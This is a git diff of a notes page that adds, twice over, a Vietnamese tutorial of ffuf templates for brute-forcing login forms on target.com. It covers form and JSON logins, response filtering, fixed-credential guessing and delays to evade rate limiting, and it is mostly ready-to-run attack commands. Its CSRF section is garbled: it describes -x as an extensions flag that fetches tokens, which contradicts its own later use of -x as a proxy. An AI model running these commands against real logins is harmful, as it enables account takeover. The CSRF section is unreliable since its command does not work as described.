@@ -6,10 +6,10 @@ tags:
 ---
 
 
-<div class="excalidraw-container" id="ex-q16ozi">
+<div class="excalidraw-container" id="ex-0plmj8">
   <div class="excalidraw-toolbar">
     <div class="excalidraw-badge">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 19l7-7 3 3-7 7-3-3z"></path><path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"></path><path d="M2 2l7.586 7.586"></path><circle cx="11" cy="11" r="2"></circle></svg>
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
       <span>Excalidraw Mindmap</span>
     </div>
     <div class="excalidraw-controls">
@@ -22,6 +22,140 @@ tags:
   <div class="excalidraw-viewport">
     <div class="excalidraw-canvas-wrapper">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1219 3821" class="excalidraw-svg" data-width="1219" data-height="3821">
+<g transform="translate(125.62,1772.48)">
+
+<rect x="-8.45166913200842" y="-1067.9263512106504" width="800" height="3076" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
+<foreignObject x="-8.45166913200842" y="-1067.9263512106504" width="800" height="3076" class="excalidraw-foreign-md">
+  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
+    <div class="notion-embed-header">
+      <div class="notion-embed-header-left">
+        <span class="notion-embed-icon">📝</span>
+        <span class="notion-embed-title">1. Template cơ bản – Brute force username &amp; password (POST form)</span>
+      </div>
+      <a href="#doc-2c4637f01ee05012e84a079b3aedc1ac98ee7584" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
+    </div>
+    <div class="notion-embed-body">
+      <p>Dưới đây là một số template dùng <strong>ffuf</strong> để brute force cổng đăng nhập (login form) mà bạn có thể tham khảo. Tùy vào cấu trúc form và phản hồi của server, bạn điều chỉnh các tham số cho phù hợp.</p>
+<hr>
+<h2>1. Template cơ bản – Brute force username &amp; password (POST form)</h2>
+<p>Giả sử form login có 2 trường <code>username</code> và <code>password</code>, server trả về mã 401 khi sai thông tin.</p>
+<pre><code class="language-bash">ffuf -w /path/to/usernames.txt:USER -w /path/to/passwords.txt:PASS \
+     -X POST \
+     -d &quot;username=USER&amp;password=PASS&quot; \
+     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+     -u http://target.com/login \
+     -fc 401
+</code></pre>
+<p><strong>Giải thích:</strong></p>
+<ul>
+<li><code>-w</code> : đường dẫn tới wordlist, gán alias <code>USER</code> và <code>PASS</code>.</li>
+<li><code>-X POST</code> : sử dụng method POST.</li>
+<li><code>-d</code> : dữ liệu gửi đi, <code>USER</code> và <code>PASS</code> sẽ được thay bằng giá trị từ wordlist.</li>
+<li><code>-H</code> : header xác định kiểu dữ liệu form.</li>
+<li><code>-u</code> : URL endpoint login.</li>
+<li><code>-fc 401</code> : lọc bỏ các response có status code 401 (sai thông tin), chỉ hiển thị các response khác (có thể là thành công).</li>
+</ul>
+<hr>
+<h2>2. Lọc theo kích thước response (thay vì status code)</h2>
+<p>Nhiều ứng dụng trả về cùng status code (vd 200) cho cả đúng/sai, nhưng nội dung khác nhau. Bạn có thể lọc theo <code>-fs</code> (filter size) hoặc <code>-fw</code> (filter words).</p>
+<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
+     -X POST \
+     -d &quot;user=USER&amp;pass=PASS&quot; \
+     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+     -u http://target.com/login \
+     -fs 1234
+</code></pre>
+<ul>
+<li><code>-fs 1234</code> : bỏ qua các response có kích thước 1234 bytes (kích thước của trang báo lỗi).</li>
+<li>Bạn có thể dùng <code>-fw</code> để lọc theo số từ, hoặc <code>-fl</code> theo số dòng.</li>
+</ul>
+<hr>
+<h2>3. Login form có thêm CSRF token</h2>
+<p>Nếu form có CSRF token, bạn cần lấy token từ GET request trước, sau đó dùng <code>ffuf</code> với chế độ <code>-mode clusterbomb</code> và sử dụng <code>-x</code> (extensions) hoặc dùng <code>ffuf</code> kết hợp với script tạo token. Tuy nhiên đơn giản nhất là dùng <code>ffuf</code> với chức năng <strong>recursion</strong> và <strong>dynamic values</strong> (từ phiên bản mới). Ví dụ nâng cao:</p>
+<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
+     -u http://target.com/login \
+     -X POST \
+     -d &quot;username=USER&amp;password=PASS&amp;csrf=CSRF&quot; \
+     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+     -mode clusterbomb \
+     -x http://target.com/get_token \
+     -mr &quot;token=(.*?)&quot; \
+     -replay-proxy http://127.0.0.1:8080
+</code></pre>
+<p>Cách này phức tạp, thường phải dùng script riêng hoặc <code>Burp Intruder</code>. Với ffuf, bạn có thể tạo token tĩnh nếu token không thay đổi giữa các request (ít gặp).</p>
+<hr>
+<h2>4. Login API trả về JSON</h2>
+<p>Nếu ứng dụng gửi/nhận JSON, bạn chỉnh <code>-H</code> và <code>-d</code> tương ứng:</p>
+<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
+     -X POST \
+     -d &#39;{&quot;username&quot;:&quot;USER&quot;,&quot;password&quot;:&quot;PASS&quot;}&#39; \
+     -H &quot;Content-Type: application/json&quot; \
+     -u http://target.com/api/login \
+     -fc 401
+</code></pre>
+<ul>
+<li>Lưu ý: dùng dấu nháy đơn <code>&#39;</code> bao quanh data nếu trong đó có dấu nháy kép <code>&quot;</code>.</li>
+</ul>
+<hr>
+<h2>5. Brute force chỉ username (password cố định) hoặc ngược lại</h2>
+<p>Nếu bạn đã biết một trong hai, chỉ cần một wordlist và thay trực tiếp giá trị còn lại:</p>
+<pre><code class="language-bash"># Chỉ brute username, password cố định là &quot;admin123&quot;
+ffuf -w users.txt:USER \
+     -X POST \
+     -d &quot;username=USER&amp;password=admin123&quot; \
+     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+     -u http://target.com/login \
+     -fc 401
+
+# Chỉ brute password, username cố định là &quot;admin&quot;
+ffuf -w passes.txt:PASS \
+     -X POST \
+     -d &quot;username=admin&amp;password=PASS&quot; \
+     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+     -u http://target.com/login \
+     -fc 401
+</code></pre>
+<hr>
+<h2>6. Thêm delay để tránh bị chặn (rate limit)</h2>
+<p>Dùng <code>-p</code> để thêm delay giữa các request (tính bằng giây):</p>
+<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
+     -X POST \
+     -d &quot;username=USER&amp;password=PASS&quot; \
+     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+     -u http://target.com/login \
+     -fc 401 \
+     -p 0.5
+</code></pre>
+<ul>
+<li><code>-p 0.5</code> : chờ 0.5 giây giữa mỗi request.</li>
+</ul>
+<hr>
+<h2>7. Sử dụng proxy để quan sát request (debug)</h2>
+<p>Thêm <code>-x http://127.0.0.1:8080</code> để gửi request qua Burp Suite:</p>
+<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
+     -X POST \
+     -d &quot;username=USER&amp;password=PASS&quot; \
+     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+     -u http://target.com/login \
+     -fc 401 \
+     -x http://127.0.0.1:8080
+</code></pre>
+<hr>
+<h2>Lưu ý quan trọng</h2>
+<ul>
+<li><strong>Chỉ sử dụng trên hệ thống bạn có quyền kiểm tra.</strong></li>
+<li>Nên dùng wordlist phù hợp (vd: SecLists).</li>
+<li>Nếu server trả về quá nhiều response giống nhau, hãy phân tích kỹ response thành công (có thể chứa chuỗi đặc biệt) rồi dùng <code>-mr</code> (match regex) thay vì filter.</li>
+<li>Nếu form có thêm field ẩn, hãy kiểm tra source HTML và thêm vào <code>-d</code>.</li>
+</ul>
+<hr>
+<p>Hy vọng các template trên giúp bạn bắt đầu brute force login bằng ffuf hiệu quả. Nếu cần tùy chỉnh thêm, hãy tham khảo tài liệu chính thức: <code>ffuf -h</code>.</p>
+
+    </div>
+  </div>
+</foreignObject>
+
+</g>
 <g transform="translate(125.62,1772.48)">
 <path d="M624.59 -795.70 L624.97 -794.86 L626.41 -794.58 L629.61 -794.16 L632.43 -794.02 L635.19 -793.95 L637.89 -793.88 L640.53 -793.88 L643.10 -793.88 L644.42 -793.88 L646.49 -793.88 L648.37 -793.88 L649.81 -793.95 L651.07 -794.02 L652.57 -794.09 L653.77 -794.16 L655.02 -794.30 L656.21 -794.51 L656.21 -794.51" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
@@ -230,3 +364,166 @@ tags:
     </div>
   </div>
 </div>
+
+
+---
+
+## 📖 Nội dung chi tiết bài viết (Writeup)
+
+<div id="doc-2c4637f01ee05012e84a079b3aedc1ac98ee7584" class="notion-callout-card">
+
+Dưới đây là một số template dùng **ffuf** để brute force cổng đăng nhập (login form) mà bạn có thể tham khảo. Tùy vào cấu trúc form và phản hồi của server, bạn điều chỉnh các tham số cho phù hợp.
+
+---
+
+## 1. Template cơ bản – Brute force username & password (POST form)
+
+Giả sử form login có 2 trường `username` và `password`, server trả về mã 401 khi sai thông tin.
+
+```bash
+ffuf -w /path/to/usernames.txt:USER -w /path/to/passwords.txt:PASS \
+     -X POST \
+     -d "username=USER&password=PASS" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -u http://target.com/login \
+     -fc 401
+```
+
+**Giải thích:**
+- `-w` : đường dẫn tới wordlist, gán alias `USER` và `PASS`.
+- `-X POST` : sử dụng method POST.
+- `-d` : dữ liệu gửi đi, `USER` và `PASS` sẽ được thay bằng giá trị từ wordlist.
+- `-H` : header xác định kiểu dữ liệu form.
+- `-u` : URL endpoint login.
+- `-fc 401` : lọc bỏ các response có status code 401 (sai thông tin), chỉ hiển thị các response khác (có thể là thành công).
+
+---
+
+## 2. Lọc theo kích thước response (thay vì status code)
+
+Nhiều ứng dụng trả về cùng status code (vd 200) cho cả đúng/sai, nhưng nội dung khác nhau. Bạn có thể lọc theo `-fs` (filter size) hoặc `-fw` (filter words).
+
+```bash
+ffuf -w users.txt:USER -w passes.txt:PASS \
+     -X POST \
+     -d "user=USER&pass=PASS" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -u http://target.com/login \
+     -fs 1234
+```
+
+- `-fs 1234` : bỏ qua các response có kích thước 1234 bytes (kích thước của trang báo lỗi).
+- Bạn có thể dùng `-fw` để lọc theo số từ, hoặc `-fl` theo số dòng.
+
+---
+
+## 3. Login form có thêm CSRF token
+
+Nếu form có CSRF token, bạn cần lấy token từ GET request trước, sau đó dùng `ffuf` với chế độ `-mode clusterbomb` và sử dụng `-x` (extensions) hoặc dùng `ffuf` kết hợp với script tạo token. Tuy nhiên đơn giản nhất là dùng `ffuf` với chức năng **recursion** và **dynamic values** (từ phiên bản mới). Ví dụ nâng cao:
+
+```bash
+ffuf -w users.txt:USER -w passes.txt:PASS \
+     -u http://target.com/login \
+     -X POST \
+     -d "username=USER&password=PASS&csrf=CSRF" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -mode clusterbomb \
+     -x http://target.com/get_token \
+     -mr "token=(.*?)" \
+     -replay-proxy http://127.0.0.1:8080
+```
+
+Cách này phức tạp, thường phải dùng script riêng hoặc `Burp Intruder`. Với ffuf, bạn có thể tạo token tĩnh nếu token không thay đổi giữa các request (ít gặp).
+
+---
+
+## 4. Login API trả về JSON
+
+Nếu ứng dụng gửi/nhận JSON, bạn chỉnh `-H` và `-d` tương ứng:
+
+```bash
+ffuf -w users.txt:USER -w passes.txt:PASS \
+     -X POST \
+     -d '{"username":"USER","password":"PASS"}' \
+     -H "Content-Type: application/json" \
+     -u http://target.com/api/login \
+     -fc 401
+```
+
+- Lưu ý: dùng dấu nháy đơn `'` bao quanh data nếu trong đó có dấu nháy kép `"`.
+
+---
+
+## 5. Brute force chỉ username (password cố định) hoặc ngược lại
+
+Nếu bạn đã biết một trong hai, chỉ cần một wordlist và thay trực tiếp giá trị còn lại:
+
+```bash
+# Chỉ brute username, password cố định là "admin123"
+ffuf -w users.txt:USER \
+     -X POST \
+     -d "username=USER&password=admin123" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -u http://target.com/login \
+     -fc 401
+
+# Chỉ brute password, username cố định là "admin"
+ffuf -w passes.txt:PASS \
+     -X POST \
+     -d "username=admin&password=PASS" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -u http://target.com/login \
+     -fc 401
+```
+
+---
+
+## 6. Thêm delay để tránh bị chặn (rate limit)
+
+Dùng `-p` để thêm delay giữa các request (tính bằng giây):
+
+```bash
+ffuf -w users.txt:USER -w passes.txt:PASS \
+     -X POST \
+     -d "username=USER&password=PASS" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -u http://target.com/login \
+     -fc 401 \
+     -p 0.5
+```
+
+- `-p 0.5` : chờ 0.5 giây giữa mỗi request.
+
+---
+
+## 7. Sử dụng proxy để quan sát request (debug)
+
+Thêm `-x http://127.0.0.1:8080` để gửi request qua Burp Suite:
+
+```bash
+ffuf -w users.txt:USER -w passes.txt:PASS \
+     -X POST \
+     -d "username=USER&password=PASS" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -u http://target.com/login \
+     -fc 401 \
+     -x http://127.0.0.1:8080
+```
+
+---
+
+## Lưu ý quan trọng
+
+- **Chỉ sử dụng trên hệ thống bạn có quyền kiểm tra.**
+- Nên dùng wordlist phù hợp (vd: SecLists).
+- Nếu server trả về quá nhiều response giống nhau, hãy phân tích kỹ response thành công (có thể chứa chuỗi đặc biệt) rồi dùng `-mr` (match regex) thay vì filter.
+- Nếu form có thêm field ẩn, hãy kiểm tra source HTML và thêm vào `-d`.
+
+---
+
+Hy vọng các template trên giúp bạn bắt đầu brute force login bằng ffuf hiệu quả. Nếu cần tùy chỉnh thêm, hãy tham khảo tài liệu chính thức: `ffuf -h`.
+
+</div>
+
+---
+
